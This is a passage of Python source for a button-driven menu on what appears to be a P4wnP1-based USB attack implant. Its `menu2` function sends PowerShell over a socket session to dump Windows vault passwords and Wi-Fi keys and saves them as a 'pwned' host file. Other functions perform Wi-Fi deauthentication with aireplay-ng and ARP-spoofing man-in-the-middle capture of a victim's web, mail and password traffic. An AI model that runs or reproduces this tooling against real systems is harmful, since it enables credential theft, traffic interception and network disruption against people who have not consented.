                        )

                    else:
                        result = subprocess.check_output(
                            "P4wnP1_cli hid run -c 'button(BTNONE)'", shell=True
                        )
                        button1 = 0
                        time.sleep(0.2)
                draw.text((64, line4), "Key2 : Exit", font=font, fill=255)
                if GPIO.input(KEY3_PIN):  # button is released
                    draw.ellipse((70, 40, 90, 60), outline=255, fill=0)  # A button
                    # result = subprocess.check_output("P4wnP1_cli hid run -c 'button(BTNONE)'", shell = True )
                else:  # button is pressed:
                    draw.ellipse(
                        (70, 40, 90, 60), outline=255, fill=1
                    )  # A button filled
                    if button2 == 0:
                        result = subprocess.check_output(
                            "P4wnP1_cli hid run -c 'button(BT2)'", shell=True
                        )
                        button2 = 1
                        time.sleep(0.2)
                        result = subprocess.check_output(
                            "P4wnP1_cli hid run -c 'button(BTNONE)'", shell=True
                        )

                    else:
                        result = subprocess.check_output(
                            "P4wnP1_cli hid run -c 'button(BTNONE)'", shell=True
                        )
                        button2 = 0
                        time.sleep(0.2)
                # time.sleep(0.1)


def setTypingSpeed():
    time.sleep(0.5)  # pause
    while GPIO.input(KEY_LEFT_PIN):
        displayText(
            " Natural typing speed",
            "",
            "",
            "               CANCEL",
            "",
            "",
            "    Fast typing speed",
        )
        if GPIO.input(KEY_UP_PIN):  # button is released
            menu = 1
        else:  # button is pressed:
            answer = 1
        if GPIO.input(KEY_LEFT_PIN):  # button is released
            menu = 1
        else:  # button is pressed:
            answer = 2
        if GPIO.input(KEY_DOWN_PIN):  # button is released
            menu = 1
        else:  # button is pressed:
            answer = 3
        if GPIO.input(KEY1_PIN):  # button is released
            menu = 1
        else:  # button is pressed:
            result = subprocess.check_output(
                "P4wnP1_cli hid run -c 'typingSpeed(100,150)'", shell=True
            )
            time.sleep(0.5)  # pause
            return ()
        if GPIO.input(KEY2_PIN):  # button is released
            menu = 1
        else:  # button is pressed:
            time.sleep(0.5)  # pause
            return ()
        if GPIO.input(KEY3_PIN):  # button is released
            menu = 1
        else:  # button is pressed:
            result = subprocess.check_output(
                "P4wnP1_cli hid run -c 'typingSpeed(0,0)'", shell=True
            )
            time.sleep(0.5)  # pause
            return ()
    time.sleep(0.5)  # pause


def ListWifi():
    cmd = subprocess.check_output("sudo iwlist wlan0 scan", shell=True)
    return cmd


def LwifiExt(word, list):
    for n in range(len(list)):
        if list[n].find(word) != -1:
            rep = list[n].split(":")
            return rep[1]
    return 0


def scanwifi():
    # list wifi APs
    cmd = "sudo iwlist wlan0 scan | grep ESSID"
    result = execCmd(cmd)
    if result == -1:
        displayError()
        return ()
    SSID = result.split("'")[1]
    SSID = SSID.replace("                    ESSID:", "")
    SSID = SSID.replace('"', "")
    ssidlist = SSID.split("\\n")
    cmd = "sudo iwlist wlan0 scan | grep Encryption"
    result = execCmd(cmd)
    if result == -1:
        displayError()
        return ()
    Ekey = result.split("'")[1]
    Ekey = Ekey.replace("                    Encryption ", "")
    Ekeylist = Ekey.split("\\n")
    for n in range(0, len(ssidlist)):
        if ssidlist[n] == "":
            ssidlist[n] = "Hidden"
        ssidlist[n] = ssidlist[n] + " [" + Ekeylist[n] + "]"
    # ----------------------------------------------------------
    listattack = ssidlist
    maximum = len(listattack)  # number of records
    cur = 0
    lastmenu = ""
    item = ["", "", "", "", "", "", "", ""]
    time.sleep(0.5)
    while GPIO.input(KEY_LEFT_PIN):
        # on boucle
        tok = 0
        if maximum < 7:
            for n in range(0, 7):
                if n < maximum:
                    if n == cur:
                        item[n] = ">" + listattack[n]
                    else:
                        item[n] = " " + listattack[n]
                else:
                    item[n] = ""
        else:
            if cur + 7 < maximum:
                for n in range(cur, cur + 7):
                    if n == cur:
                        item[tok] = ">" + listattack[n]
                    else:
                        item[tok] = " " + listattack[n]
                    tok = tok + 1
            else:
                for n in range(maximum - 8, maximum - 1):
                    if n == cur:
                        item[tok] = ">" + listattack[n]
                    else:
                        item[tok] = " " + listattack[n]
                    tok = tok + 1
        if GPIO.input(KEY_UP_PIN):  # button is released
            menu = 1
        else:  # button is pressed:
            cur = cur - 1
            if cur < 0:
                cur = 0
        if GPIO.input(KEY_DOWN_PIN):  # button is released
            menu = 1
        else:  # button is pressed:
            cur = cur + 1
            if cur > maximum - 2:
                cur = maximum - 2
        if GPIO.input(KEY_RIGHT_PIN):  # button is released
            menu = 1
        else:  # button is pressed:
            lastmenu = listattack[cur]
            displayText(" TOBE IMPLEMENTED (WIFI)", "", "", "", "", "", "")
            time.sleep(2)
            return lastmenu
        # print(str(cur) + " " + listattack[cur])        #debug
        displayText(
            item[0], item[1], item[2], item[3], item[4], item[5], item[6]
        )
        time.sleep(0.1)
    return ""


def trigger1():
    while GPIO.input(KEY_PRESS_PIN):
        with canvas(device) as draw:
            if GPIO.input(KEY_UP_PIN):  # button is released
                draw.polygon([(20, 20), (30, 2), (40, 20)], outline=255, fill=0)  # Up
                draw.text((28, line2 + 2), "1", font=font, fill=255)
            else:  # button is pressed:
                draw.polygon(
                    [(20, 20), (30, 2), (40, 20)], outline=255, fill=1
                )  # Up filled
                shell('P4wnP1_cli trigger send -n "oled" -v 1')

            if GPIO.input(KEY_LEFT_PIN):  # button is released
                draw.polygon([(0, 30), (18, 21), (18, 41)], outline=255, fill=0)  # left
                draw.text((11, line5 - 7), "3", font=font, fill=255)
            else:  # button is pressed:
                draw.polygon(
                    [(0, 30), (18, 21), (18, 41)], outline=255, fill=1
                )  # left filled
                shell('P4wnP1_cli trigger send -n "oled" -v 3')

            if GPIO.input(KEY_RIGHT_PIN):  # button is released
                draw.polygon(
                    [(60, 30), (42, 21), (42, 41)], outline=255, fill=0
                )  # right
                draw.text((45, line5 - 7), "4", font=font, fill=255)
            else:  # button is pressed:
                draw.polygon(
                    [(60, 30), (42, 21), (42, 41)], outline=255, fill=1
                )  # right filled
                shell('P4wnP1_cli trigger send -n "oled" -v 4')

            if GPIO.input(KEY_DOWN_PIN):  # button is released
                draw.polygon(
                    [(30, 60), (40, 42), (20, 42)], outline=255, fill=0
                )  # down
                draw.text((28, line6 + 3), "2", font=font, fill=255)
            else:  # button is pressed:
                draw.polygon(
                    [(30, 60), (40, 42), (20, 42)], outline=255, fill=1
                )  # down filled
                shell('P4wnP1_cli trigger send -n "oled" -v 2')

            if GPIO.input(KEY1_PIN):  # button is released
                draw.ellipse((70, 0, 90, 20), outline=255, fill=0)  # A button
                draw.text((75, line2), "10", font=font, fill=255)
            else:  # button is pressed:
                draw.ellipse((70, 0, 90, 20), outline=255, fill=1)  # A button filled
                shell('P4wnP1_cli trigger send -n "oled" -v 10')

            if GPIO.input(KEY2_PIN):  # button is released
                draw.ellipse((100, 20, 120, 40), outline=255, fill=0)  # B button
                draw.text((105, line5 - 7), "20", font=font, fill=255)
            else:  # button is pressed:
                draw.ellipse((100, 20, 120, 40), outline=255, fill=1)  # B button filled
                shell('P4wnP1_cli trigger send -n "oled" -v 20')

            if GPIO.input(KEY3_PIN):  # button is released
                draw.ellipse((70, 40, 90, 60), outline=255, fill=0)  # A button
                draw.text((75, line7 - 5), "30", font=font, fill=255)
            else:  # button is pressed:
                draw.ellipse((70, 40, 90, 60), outline=255, fill=1)  # A button filled
                shell('P4wnP1_cli trigger send -n "oled" -v 30')
            draw.text((25, line4 + 2), "Go", font=font, fill=255)
            # time.sleep(0.1)


def Osdetection():
    displayText("", "", "", "      PLEASE WAIT", "", "", "")
    os = identifyOS("172.16.0.2")
    if str(os) == "b''":
        while GPIO.input(KEY_LEFT_PIN):
            displayText(
                "Experimental nmap OS",
                "detection",
                "",
                "Too many fingerprints match this host",
                " Or Zero ",
                "",
                "Press LEFT to exit",
            )
        return

    detail = osDetails("172.16.0.2")

    while GPIO.input(KEY_LEFT_PIN):
        displayText(
            "Experimental nmap OS",
            "detection",
            "",
            os.replace("Microsoft", "MS").replace("Windows", "win"),
            detail.replace("Microsoft", "MS").replace("Windows", "win"),
            "",
            "Press LEFT to exit",
        )


def socketCreate():
    try:
        global host
        global port
        global s
        port = 4445
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        host = ""
        if port == "":
            socketCreate()
        # socketCreate()
    except socket.error as msg:
        print("socket creation error: " + str(msg[0]))


def socketBind():
    try:
        print("Binding socket at port %s" % (port))
        s.bind((host, port))
        s.listn(1)
    except socket.error as msg:
        print("socket bindig error: " + str(msg[0]))
        print("Retring...")
        socketBind()


def socketAccept():
    global conn
    global addr
    global hostname
    try:
        conn, addr = s.accept()
        print("[!] Session opened at %s:%s" % (addr[0], addr[1]))
        menu2()
    except socket.error as msg:
        print("Socket Accepting error: " + str(msg[0]))


def sendps1(ps1file):
    f = open(ps1file, "r")
    for x in f:
        conn.send(x.encode())
        result = conn.recv(16834)
        print(result.decode())


def menu2():
    displayText("", "", "", "      PLEASE WAIT", "", "", "")
    shell("P4wnP1_cli hid job 'GetChrome.js'")
    hack = ""
    command = 'Test-Connection -computer "google.com" -count 1 -quiet'
    conn.send(command.encode())
    result = conn.recv(16834)
    if result.decode()[:-6] == "T":
        print("Internet is on, on host")
    conn.send("hostname".encode())
    result = conn.recv(16834)
    print(result.decode().replace("\r\n", "")[:-1])
    hostname = result.decode().replace("\r\n", "")[:-1]
    command = '[System.IO.DriveInfo]::getdrives() |where-object {$_.VolumeLabel -match "USBKEY"}|sort {$_.name} |foreach-object {; echo "$(echo $_.name)";}'
    conn.send(command.encode())
    result = conn.recv(16834)
    usbkey = result.decode().replace("\r\n", "")[:-1]
    print("Usb key detected in : [" + usbkey + "]")
    hack = hostname + "\n"
    hack = hack + "Passwords windows :\n"
    command = "$ClassHolder = [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];$VaultObj = new-object Windows.Security.Credentials.PasswordVault;"
    conn.send(command.encode())
    result = conn.recv(16834)
    print(result.decode())
    command = "$VaultObj.RetrieveAll() | foreach { $_.RetrievePassword(); $_ }"
    conn.send(command.encode())
    result = conn.recv(16834)
    hack = hack + result.decode()
    print(result.decode())
    displayText("", "", "GETTING MS EXPLORER", "      PASSWORDS", "", "", "")
    command = '$SSID=((netsh wlan show profiles) -match \'Profil Tous les utilisateurs[^:]+:.(.+)$\').replace("Profil Tous les utilisateurs","").replace(":","").replace(" ","").split("\\n");$fin="";'
    conn.send(command.encode())
    result = conn.recv(16834)
    print(result.decode())
    command = "for ($n=0;$n -le $SSID.count-1;$n++){try {;$fin = $fin + $SSID[$n]+((netsh wlan show profiles $SSID[$n].Substring($SSID[$n].Length -($SSID[$n].Length -1)) key=clear) -match 'Contenu de la c[^:]+:.(.+)$').split(\":\")[1];} catch {};};$fin"
    conn.send(command.encode())
    time.sleep(2)
    result = conn.recv(16834)
    print(result.decode())
    hack = hack + "Wifi : \n" + result.decode()
    displayText("", "", "GET STORED WIFI SSID", "      PASSWORDS", "", "", "")
    time.sleep(2)
    displayText("", "", "GET GOOGLE CHROME", "      PASSWORDS", "", "", "")
    time.sleep(2)
    print("end")
    # done , let save this on disk
    f = open("/root/" + hostname + ".txt", "w+")
    f.write(hack)
    f.close()
    print(hostname + ".txt saved, host is pwned")
    while 1:
        # cmd = raw_input('PS >')
        cmd = "quit"
        if cmd == "quit":
            conn.close()
            s.close()
            while GPIO.input(KEY_LEFT_PIN):
                displayText(
                    "DONE HOST PWNED FIND",
                    "ALL INFOS IN FILE",
                    "/root/" + hostname + ".txt",
                    "CHOME CREDS are in",
                    usbkey + hostname + "chrome.txt",
                    "",
                    "Press LEFT to Exit",
                )
            return
            # sys.exit()
        command = conn.send(cmd)
        result = conn.recv(16834)
        print(result)


def hostselect():
    displayText("", "", "", "wait, may take a while ", "", "", "")
    cmd = "hostname -I"
    result = execCmd(cmd)
    if result == -1:
        displayError()
        return ()
    subnetIp = result.split(" ")[0].split("'")[1]
    pos = subnetIp.rfind(".")
    cmd = (
        "nmap -sL -Pn "
        + str(subnetIp[0:pos])
        + ".0/24 | grep -v 'Nmap scan report for "
        + subnetIp[0:2]
        + "'"
    )
    result = execCmd(cmd)
    if result == -1:
        displayError()
        return ()
    hosts = result
    hostlist = hosts.split("\\n")
    del hostlist[-1]
    del hostlist[-1]
    del hostlist[0]
    for i in range(0, len(hostlist)):
        hostlist[i] = hostlist[i][21:]
    # print(hostlist[i][21:])
    file = hostlist
    maximum = len(hostlist)
    cur = 1
    lastmenu = ""
    item = ["", "", "", "", "", "", "", ""]
    time.sleep(0.5)
    while GPIO.input(KEY_LEFT_PIN):
        # on boucle
        tok = 1
        if maximum < 8:
            for n in range(1, 8):
                if n < maximum:
                    if n == cur:
                        item[n - 1] = ">" + file[n]
                    else:
                        item[n - 1] = " " + file[n]
                else:
                    item[n - 1] = ""
        else:
            if cur + 7 < maximum:
                for n in range(cur, cur + 7):
                    if n == cur:
                        item[tok - 1] = ">" + file[n]
                    else:
                        item[tok - 1] = " " + file[n]
                    tok = tok + 1
            else:
                for n in range(maximum - 8, maximum - 1):
                    if n == cur:
                        item[tok - 1] = ">" + file[n]
                    else:
                        item[tok - 1] = " " + file[n]
                    tok = tok + 1
        if GPIO.input(KEY_UP_PIN):  # button is released
            menu = 1
        else:  # button is pressed:
            cur = cur - 1
            if cur < 1:
                cur = 1
        if GPIO.input(KEY_DOWN_PIN):  # button is released
            menu = 1
        else:  # button is pressed:
            cur = cur + 1
            if cur > maximum - 2:
                cur = maximum - 2
        if GPIO.input(KEY_RIGHT_PIN):  # button is released
            menu = 1
        else:  # button is pressed:
            lastmenu = file[cur]
            selected = lastmenu.split("(")[1].split(")")[0]
            print(selected)
            # return(lastmenu)
            return selected
        # ----------
        displayText(
            item[0], item[1], item[2], item[3], item[4], item[5], item[6]
        )
        time.sleep(0.1)


def nmap():
    selected = hostselect()
    choise = 0
    while choise == 0:
        displayText(
            "                  YES",
            "",
            "save the nmap?",
            "this will take a while",
            "/BeboXgui/nmap/<IP>.txt   ",
            "",
            "                   NO",
        )
        if not GPIO.input(KEY1_PIN):  # button is released
            choise = 1  # A button
        if not GPIO.input(KEY3_PIN):  # button is released
            choise = 2
    displayText("", "", "", "    wait ", "", "", "")

    if choise == 1:
        cmd = "nmap -Pn -A -v " + selected + " > nmap/" + selected + ".txt"
        result = execCmd(cmd)
        if result == -1:
            displayError()
            return ()

        cmd = "cat " + "nmap/" + selected + ".txt |  grep -v Discovered | grep  tcp"
        result = execCmd(cmd)
        if result == -1:
            displayError()
            return ()
    else:
        cmd = "nmap -Pn -A " + selected + " | grep tcp"
        result = execCmd(cmd)
        if result == -1:
            displayError()
            return ()

    result = str(result).split("'")[1].split("\\n")[:-1]
    print(result)
    toprint = ["", "", "", "", "", "", ""]
    for i in range(0, len(result)):
        if i >= len(toprint):
            break
        toprint[i] = "_" + result[i]
    displayText(
        toprint[0],
        toprint[1],
        toprint[2],
        toprint[3],
        toprint[4],
        toprint[5],
        toprint[6],
    )
    time.sleep(10)
    # TODO add the vulnerability scan


def nmapLocal():
    selected = "172.16.0.2"
    choise = 0
    while choise == 0:
        displayText(
            "                  YES",
            "",
            "save the nmap?",
            "this will take a while",
            "/BeboXgui/nmap/<IP>.txt   ",
            "",
            "                   NO",
        )
        if not GPIO.input(KEY1_PIN):  # button is released
            choise = 1  # A button
        if not GPIO.input(KEY3_PIN):  # button is released
            choise = 2
    displayText("", "", "", "    wait ", "", "", "")

    if choise == 1:
        cmd = "nmap -Pn -A " + selected
        result = execCmd(cmd)
        if result == -1:
            displayError()
            return ()
        f = open("nmap/" + str(selected) + ".txt", "w+")
        reportList = str(result).split("'")[1].split("\\n")
        for line in reportList:
            # print(line + "\\n")
            f.write(line + "\n")
        f.close()
        cmd = "cat " + selected + ".txt | grep tcp"
        result = execCmd(cmd)
        if result == -1:
            displayError()
            return ()
    else:
        cmd = "nmap -Pn -A " + selected + " | grep tcp"
        result = execCmd(cmd)
        if result == -1:
            displayError()
            return ()

    result = str(result).split("'")[1].split("\\n")[:-1]
    print(result)
    toprint = ["", "", "", "", "", "", ""]
    for i in range(0, len(result)):
        if i >= len(toprint):
            break
        toprint[i] = "_" + result[i]
    displayText(
        toprint[0],
        toprint[1],
        toprint[2],
        toprint[3],
        toprint[4],
        toprint[5],
        toprint[6],
    )
    time.sleep(10)
    # TODO add the vulnerability scan


def update():
    displayText("", "", "", "U NEED Wifi Connection ", "", "", "")
    time.sleep(8)
    try:
        # Popen(['nohup','/bin/bash','/root/BeBoXGui/update.sh'], stdout=open('/dev/null','w'), stderr=open('/dev/null','a'),preexec_fn=os.setpgrp )
        Popen(["nohup", "/bin/bash", "/root/BeBoXGui/update.sh"], preexec_fn=os.setpgrp)
        displayText(
            "updating",
            "it's a quite buggy",
            "im updating",
            "the screen will freeze",
            "it's normal",
            "",
            ":>",
        )
        time.sleep(10)
        exit()
    except:
        displayError()
        displayText("", "", "", "Do U have Wifi Connection? ", "", "", "")
        time.sleep(5)


def vulnerabilityScan():
    displayText(
        "Remeber:",
        "Firts u need to",
        "perform an Nmap",
        "and then ",
        "save the output",
        "this is an",
        "experimental feat",
    )
    time.sleep(5)
    displayText("", "", "", "Wait", "", "", "")
    selected = fileSelect("/root/BeBoXGui/nmap/", ".txt")
    filePath = "/root/BeBoXGui/nmap/" + selected
    cmd = "cat " + filePath + " |  grep -v Discovered | grep  tcp"
    result = execCmd(cmd)
    if result == -1:
        displayError()
        time.sleep(5)
        return ()
    toSearch = str(result).split("'")[1].split("\\n")
    del toSearch[-1]
    founded = 0
    for i in toSearch:
        auxi = i.replace("\t", " ").replace("   ", " ").replace("  ", " ").split(" ")
        print(auxi)
        i = str(" ".join(auxi[3:]))
        print("search for: " + i)
        cmd = "searchsploit " + "'" + str(i) + "'"
        result = execCmd(cmd)
        if result == -1:
            displayError()
            time.sleep(5)
        if (str(result).split("'")[1])[1] == "-":
            founded += 1
    print(founded)
    displayText("", "", "", "founded: " + str(founded), "", "", "")
    time.sleep(5)


def getSSID():
    # return [name,channel,mac]
    displayText("", "", "wait", "", "", "", "")
    # list wifi APs
    cmd = "airmon-ng start wlan0 && airmon-ng start wlan0mon"
    result = execCmd(cmd)
    if result == -1:
        displayError()
        return ()
    try:
        cmd = "touch touchedcommand.sh && echo '#!/bin/bash\nairodump-ng wlan0mon -w reportAiro -a &' > touchedcommand.sh && chmod +x touchedcommand.sh"
        result = execCmd(cmd)
        if result == -1:
            displayError()
            return ()
        # Popen(['nohup','/bin/bash','/root/BeBoXGui/update.sh'], stdout=open('/dev/null','w'), stderr=open('/dev/null','a'),>
        Popen(["nohup", "/bin/bash", "touchedcommand.sh"], preexec_fn=os.setpgrp)
        displayText("", "", "wait", "", "", "", "")
        time.sleep(10)
        errore = 0
        while errore == 0:
            cmd = "ps -aux | grep 'airodump-ng wlan0mon -w reportAiro -a' | head -n 1 | cut -d ' ' -f7"
            result = execCmd(cmd)
            if result == -1:
                displayError()
                time.sleep(5)
                return ()
            cmd = "kill " + (str(result).split("'")[1])[:-2]
            # print(cmd)
            result = execCmd(cmd)
            if result == -1:
                # print("errore nella kill")
                # displayError()
                time.sleep(5)
                errore = 1

    except:
        displayError()
        time.sleep(5)
        return ()
    cmd = "cat reportAiro-01.csv"
    result = execCmd(cmd)
    if result == -1:
        displayError()
        return ()
    cmd = "rm -rf reportAiro* && rm nohup.out && rm touchedcommand.sh"
    toDEl = execCmd(cmd)
    if toDEl == -1:
        displayError()
        return ()
    result = str(result).replace("\\r", "").split("\\n")
    del result[0]
    del result[0]
    toRemove = result.index(
        "Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs"
    )
    result = result[: toRemove - 1]
    for i in range(0, len(result)):
        result[i] = result[i].split(",")
        del result[i][-1]
        result[i] = result[i][-1] + "," + result[i][3] + "," + result[i][0]

    ssidlist = result
    # print("eccomi")
    # print(ssidlist)

    # ----------------------------------------------------------
    listattack = ssidlist
    maximum = len(listattack)  # number of records
    cur = 0
    lastmenu = ""
    item = ["", "", "", "", "", "", "", ""]
    time.sleep(0.5)
    while GPIO.input(KEY_LEFT_PIN):
        # on boucle
        tok = 0
        if maximum < 7:
            for n in range(0, 7):
                if n < maximum:
                    if n == cur:
                        item[n] = ">" + listattack[n]
                    else:
                        item[n] = " " + listattack[n]
                else:
                    item[n] = ""
        else:
            if cur + 7 < maximum:
                for n in range(cur, cur + 7):
                    if n == cur:
                        item[tok] = ">" + listattack[n]
                    else:
                        item[tok] = " " + listattack[n]
                    tok = tok + 1
            else:
                for n in range(maximum - 8, maximum - 1):
                    if n == cur:
                        item[tok] = ">" + listattack[n]
                    else:
                        item[tok] = " " + listattack[n]
                    tok = tok + 1
        if GPIO.input(KEY_UP_PIN):  # button is released
            menu = 1
        else:  # button is pressed:
            cur = cur - 1
            if cur < 0:
                cur = 0
        if GPIO.input(KEY_DOWN_PIN):  # button is released
            menu = 1
        else:  # button is pressed:
            cur = cur + 1
            if cur > maximum - 2:
                cur = maximum - 2
        if not GPIO.input(KEY_LEFT_PIN):  # button is released
            return ()
        if GPIO.input(KEY_RIGHT_PIN):  # button is released
            menu = 1
        else:  # button is pressed:
            lastmenu = listattack[cur]
            # print(lastmenu)
            return lastmenu
        # print(str(cur) + " " + listattack[cur])        #debug
        displayText(
            item[0], item[1], item[2], item[3], item[4], item[5], item[6]
        )
        time.sleep(0.1)
    return ""


def deauther():
    target = getSSID()
    print(target)
    # name,channel,mac
    displayText("this will work", "for 10 second", "", "", "", "", "")
    try:
        target = target.split(",")
        print(target[2])
    except:
        displayError()
        return ()

    # cmd = "airodump-ng -c " + str(target[1] )+" --bssid " + str(target[2]) + " wlan0mon && echo 'finito' "
    ##cmd2 =  "aireplay-ng -0 10 -a " + str(target[2]) + " wlan0mon"
    tx1 = (
        "timeout 2s airodump-ng -c "
        + str(target[1])
        + " --bssid "
        + str(target[2])
        + " wlan0mon"
    )
    tx2 = "timeout 60s aireplay-ng -0 0 -a " + str(target[2]) + " wlan0mon"
    cmd = (
        "touch touchedcommand.sh && echo '#!/bin/bash\n"
        + tx1
        + " &' > touchedcommand.sh && chmod +x touchedcommand.sh"
    )
    result = execCmd(cmd)
    if result == -1:
        displayError()
        return ()
    Popen(["nohup", "/bin/bash", "touchedcommand.sh"], preexec_fn=os.setpgrp)
    displayText("", "", "set the channel", "", "", "", "")
    time.sleep(4)
    # print(cmd)
    # subprocess.call(["timeout 2s",str(cmd)])
    ##Popen(['timeout',cmd],preexec_fn=os.setpgrp)
    cmd = (
        "echo '#!/bin/bash\n"
        + tx2
        + " &' > touchedcommand.sh && chmod +x touchedcommand.sh"
    )
    result = execCmd(cmd)
    if result == -1:
        displayError()
        return ()
    Popen(["nohup", "/bin/bash", "touchedcommand.sh"], preexec_fn=os.setpgrp)
    displayText("", "", "doing the stuff", "", "", "", "")
    time.sleep(10)
    cmd = "rm touchedcommand.sh"
    toDEl = execCmd(cmd)
    if toDEl == -1:
        displayError()
        return ()
    return ()


def selectFromCat(cmd, outputFile):
    return ()


def deautherClient():
    ###select the AP
    displayMsg("Select the AP", 3)
    # name,channel,mac
    selectedAP = getSSID()
    try:
        selectedAP = selectedAP.split(",")
        print(selectedAP)
    except:
        displayError()
        return ()
    displayMsg("select the Client", 1)
    if not selectedAP:
        displayError()
        return ()
    cmd = (
        " airodump-ng -d "
        + selectedAP[2]
        + " -c "
        + selectedAP[1]
        + " wlan0mon -w result"
    )
    # print(cmd)

    if autoKillCommand(cmd, 20) == -1:
        displayError()
        return ()
    cmd = "cat result-01.csv"
    result = execCmd(cmd)
    if result == -1:
        displayError()
        return ()
    result = str(result).replace("\\r", "").split("\\n")
    toRemove = result.index(
        "Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs"
    )
    result = result[toRemove + 1 : -1]
    # print(result)
    del result[-1]
    for i in range(0, len(result)):
        result[i] = result[i].split(",")[0]
    selectedtarget = checklist(result)
    # print(selectedtarget)
    displayMsg("Deauthing", 1)
    tx1 = (
        "airodump-ng -c "
        + str(selectedAP[1])
        + " --bssid "
        + str(selectedAP[2])
        + " wlan0mon"
    )
    tx2 = (
        "aireplay-ng -0 0 -a "
        + str(selectedAP[2])
        + " -c "
        + str(selectedtarget)
        + " wlan0mon"
    )
    print(tx1)
    if autoKillCommand(tx1, 2) == -1:
        displayError()
        return ()
    print(tx2)
    if autoKillCommand(tx2, 30) == -1:
        displayError()
        return ()
    displayMsg("Done", 4)
    cmd = "rm -rf result*"
    result = execCmd(cmd)
    if result == -1:
        displayError()
        return ()

    return ()


def arpSpoof():
    myTime = 86400
    displayMsg("select target", 3)
    victimIP = hostselect()
    displayMsg("Please Wait", 1)
    cmd = "sysctl -w net.ipv4.ip_forward=1"
    result = execCmd(cmd)
    if result == -1:
        displayError()
        return ()

    cmd = "ip r | grep default |  head -n 1 | cut -d ' ' -f3"
    result = execCmd(cmd)
    if result == -1:
        displayError()
        return ()
    routerIp = (str(result).split("'")[1])[:-2]
    print(routerIp)
    print(victimIP)
    cmd1 = "arpspoof -i wlan0 -t " + str(victimIP) + " " + str(routerIp)
    cmd2 = "arpspoof -i wlan0 -t " + str(routerIp) + " " + str(victimIP)
    cmd3 = cmd1 + "&\n" + cmd2
    if autoKillCommandNoKill(cmd3, myTime) == -1:
        displayError()
        return ()
    cmd1 = " iptables-legacy -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080"
    cmd2 = " iptables-legacy -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8080"
    execCmd(cmd1)
    execCmd(cmd2)

    cmdDsniff = "dsniff -i wlan0 -w Dsniff" + str(victimIP) + ".txt"
    if autoKillCommandNoKill(cmdDsniff, myTime) == -1:
        displayError()
        return ()
    cmdUrl = "urlsnarf -i wlan0 > Url" + str(victimIP) + ".clf"
    if autoKillCommandNoKill(cmdUrl, myTime) == -1:
        displayError()
        return ()
    cmdMIMT = (
        " mitmdump --mode transparent --showhost -w Mitm" + str(victimIP) + ".mitm"
    )
    if autoKillCommandNoKill(cmdMIMT, myTime) == -1:
        displayError()
        return ()
    cmdMail = "mailsnarf -i wlan0 > Mail" + str(victimIP) + ".mbox"
    if autoKillCommandNoKill(cmdMail, myTime) == -1:
        displayError()
        return ()
    time.sleep(10)
    uscire = 0
    while uscire == 0:
        if GPIO.input(KEY_RIGHT_PIN):  # button is released
            menu = 1
        else:  # button is pressed:
            uscire = 1
        displayMsg("press right to exit", 0.2)

    killCommand("dsniff")
    killCommand("urlsnarf")
    killCommand("mitm")
    killCommand("mailsnarf")
    killCommand("arpspoof")
    killCommand("arpspoof")

    cmd = "iptables-legacy -t nat -F"
    result = execCmd(cmd)
    if result == -1:
        displayError()
        return ()
    cmd = "sysctl -w net.ipv4.ip_forward=0"
    result = execCmd(cmd)
    if result == -1:
        displayError()
        return ()


def main():
    socketCreate()
    socketBind()
    socketAccept()


# init vars
cursor = 1
page = 0
menu = 1
item = ["", "", "", "", "", "", "", ""]
selection = 0
if SCNTYPE == 1:
    print("sctype")
    splash()  # display boot splash image ---------------------------------------------------------------------
    # print("selected : " + fileSelect(hidpath,".js"))
    device.contrast(2)
while 1:
    if GPIO.input(KEY_UP_PIN):  # button is released
        menu = 1
    else:  # button is pressed:
        cursor = cursor - 1
        if cursor < 1:
            if page == 49:
                page = 0
            elif page == 0:
                page = 49
            cursor = 7

    if GPIO.input(KEY_LEFT_PIN):  # button is released
        menu = 1
    else:  # button is pressed:
        # back to main menu on Page 0
        page = 0
    if GPIO.input(KEY_RIGHT_PIN):  # button is released
        menu = 1
    else:  # button is pressed:
        selection = 1
    if GPIO.input(KEY_DOWN_PIN):  # button is released
        menu = 1
    else:  # button is pressed:
        cursor = cursor + 1
        if cursor > 7:
            if page == 0:
                page = 49
            elif page == 49:
                page = 0
            cursor = 1
    # -----------
    if selection == 1:
        # une option du menu a ete validee on va calculer la page correspondante
        if page == 7:
            # system menu
            if cursor == 1:
                systemInfo()
            if cursor == 2:
                brightness = setContrast(brightness)
            if cursor == 3:
                # os detection
                Osdetection()
            if cursor == 4:
                screenOff()
            if cursor == 5:
                keyTest()
            if cursor == 6:
                # cmd = "reboot"
                # subprocess.check_output(cmd, shell = True )
                restart()
            if cursor == 7:
                exit()
                cmd = "poweroff"
                execCmd(cmd)

        if page == 14:
            # HID related menu
            if cursor == 1:
                # run hid script
                runhid()
            if cursor == 2:
                # gamepad
                Gamepad()
            if cursor == 3:
                # mouse
                Mouse()
            if cursor == 4:
                # Set typing speed
                setTypingSpeed()
        if page == 21:
            if cursor == 1:
                # SSID LIST
                scanwifi()
            if cursor == 2:
                hostselect()
            if cursor == 3:
                nmap()
            if cursor == 4:
                vulnerabilityScan()
            if cursor == 5:
                deauther()
            if cursor == 6:
                deautherClient()
        if page == 28:
            # trigger section
            if cursor == 1:
                trigger1()
        if page == 35:
            # template section menu
            if cursor == 1:
                # FULL_SETTINGS
                template = templateSelect("FULL_SETTINGS")
                if template != "":
                    ApplyTemplate(template, "f")
            if cursor == 2:
                # BLUETOOTH
                template = templateSelect("BLUETOOTH")
                if template != "":
                    ApplyTemplate(template, "b")
            if cursor == 3:
                # USB
                template = templateSelect("USB")
                print(template)
                if template != "":
                    ApplyTemplate(template, "u")
            if cursor == 4:
                # WIFI
                template = templateSelect("WIFI")
                if template != "":
                    ApplyTemplate(template, "w")
            if cursor == 5:
                # TRIGGER_ACTIONS
                template = templateSelect("TRIGGER_ACTIONS")
                if template != "":
                    ApplyTemplate(template, "t")
            if cursor == 6:
                # NETWORK
                template = templateSelect("NETWORK")
                if template != "":
                    ApplyTemplate(template, "n")
        if page == 42:
            # infosec commands
            if cursor == 1:
                arpSpoof()

        if page == 56:
            if cursor == 1:
                nmapLocal()

        # main menus section
        if page == 49:
            if cursor == 1:
                page = 56
            if cursor == 7:
                update()

        if page == 0:
            # we are in main menu
            if cursor == 1:
                # call about
                about()
            if cursor == 2:
                # system menu
                page = 7
